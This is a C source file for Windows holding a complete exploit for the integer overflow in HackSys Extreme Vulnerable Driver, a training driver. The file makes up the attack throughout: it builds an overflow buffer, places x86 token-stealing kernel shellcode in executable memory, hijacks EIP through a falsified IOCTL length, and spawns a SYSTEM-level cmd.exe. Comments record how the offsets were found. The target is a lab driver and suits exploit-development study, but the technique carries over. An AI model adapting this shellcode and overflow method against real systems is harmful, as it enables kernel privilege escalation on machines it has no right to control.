#include "stdafx.h"
#include "windows.h"

int main()
{
	printf("Starting exploitation of HEVD integer overflow\r\n");
	printf("Exploit by @tekwizz123\r\n");
	printf("-----------------------------------------------------\r\n\r\n");

	printf("Opening handle to device...\r\n");
	HANDLE devHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL);
	if (devHandle == INVALID_HANDLE_VALUE) {
		printf("Could not open handle to HEVD driver.\r\n");
		return 1;
	}
	printf("Device handle: %i\r\n", devHandle);

	printf("Setting up input for IOCTL call.\r\n");
	DWORD bytesReturned = 0; // Need something to hold bytes returned so lets allocate a DWORD for this purpose. We will pass a pointer to this DWORD when we call DeviceIOControl.
	byte inBuffer[0x830] = { 0 }; // Set up the inBuffer byte buffer holding our input to the IOCTL call.

	/* SUPER IMPORTANT! The buffer is 0x800 in size. For some reason if we overflow it with 0x900 0x41's we can analyze the stack fine with !analyze -v but trying
	 other characters won't work. Its actually easier if we do a smaller overflow, say 0x830 bytes, which will allow the program to try execute the address we overwrite
	 EIP with. Much, much, much, ...., much easier. :)

	Anyway for reference here is the code I used to try figure out the offsets:

	memset(inBuffer, '\x41', 0x830);
	memset(inBuffer+0x800, '\x42', 4);
	memset(inBuffer + 0x804, '\x43', 4);
	memset(inBuffer + 0x808, '\x44', 4);
	memset(inBuffer + 0x80C, '\x45', 4);
	memset(inBuffer + 0x810, '\x46', 4);
	memset(inBuffer + 0x814, '\x47', 4);
	memset(inBuffer + 0x818, '\x48', 4);
	memset(inBuffer + 0x81C, '\x49', 4);
	memset(inBuffer + 0x820, '\x4A', 4);
	memset(inBuffer + 0x824, '\x4B', 4);
	memset(inBuffer + 0x828, '\x4C', 4);
	memset(inBuffer + 0x82C, '\x4D', 4);
	memcpy(inBuffer + 0x830-4, "\xb0\xb0\xd0\xba", 4);

	*/
	
	printf("Allocating shellcode...\r\n");
	char shellcode[66] = (
		"\x60" // PUSHAD
		"\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
		"\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
								   // #---[Copy System PID token]
		"\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET |
		"\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx |
		"\x75\xED" // jnz                                          -> |
		"\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx
								   //#---[Recover]
		"\x61" // popad
		"\x31\xC0" // Set NTSTATUS->STATUS_SUCCESS so calling function thinks we exited successfully
		// *NOTE THIS IS DIFFERENT AS WE NEED TO REPLICATE THE POP EBP, RET 8 FROM THE ORIGINAL CODE
		"\x5D" // POP EBP
		"\xC2\x08\x00" // RET 8 
		);
	printf("Shellcode size: %i\r\n", sizeof(shellcode));

	printf("Reserving RWX memory for shellcode with VirtualAlloc\r\n");
	LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("Copying shellcode into this memory\r\n");
	memcpy(shellcodeAddress, shellcode, sizeof(shellcode));
	LPVOID sourceAddress = &shellcodeAddress;

	printf("Setting up the 0x830 sized buffer we will send.\r\n");
	memset(inBuffer, '\x41', 0x830); // Initalize the buffer to be all 0x41's
	memcpy(inBuffer + 0x828, sourceAddress, 4); // After 0x828 bytes, the next 4 bytes in whatever buffer we send start to overwrite EIP. So make sure we overwrite it with the address of our shellcode.
	memcpy(inBuffer + 0x830 - 4, "\xb0\xb0\xd0\xba", 4); // Fill end of buffer with terminating bytes aka 0xBAD0B0B0

	printf("Sending driver the IOCTL message.\r\n");
	DeviceIoControl(devHandle, 0x222027, inBuffer, 0xFFFFFFFF, NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL); // Important to note, we usually do sizeof(inBuffer) or something similar here when we pass the size into the call, but this doesn't have to be this. WE CAN LIE! >:D
	
	printf("Sweet shells now raining...\r\n");
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi); // Spawn cmd.exe with SYSTEM privs as we have now stolen the SYSTEM token.
	
	return 0;
}